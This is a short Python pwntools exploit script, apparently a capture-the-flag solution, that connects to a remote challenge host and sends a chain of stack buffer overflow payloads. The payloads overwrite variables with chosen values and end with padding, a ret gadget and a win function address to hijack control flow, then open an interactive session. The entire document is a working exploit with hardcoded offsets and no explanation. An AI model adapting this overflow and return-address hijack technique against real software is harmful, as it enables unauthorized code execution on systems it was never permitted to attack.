from pwn import *
context.log_level = 'debug'
context.binary = './proper'

# p = process('./proper')     
p = remote('0.cloud.chals.io', 21543)
p.sendline(b"A" * 268 + p32(1))

p.sendline(b"A" * 520 + p32(0x29) + p32(1))

p.sendline(b"A" * 76 + p32(0xcc07c9))

win_addr = 0x40123b
ret_gadget = 0x40101a  
payload = b"A" * (6768 + 8) + p64(ret_gadget) + p64(win_addr)
p.sendline(payload)

p.interactive()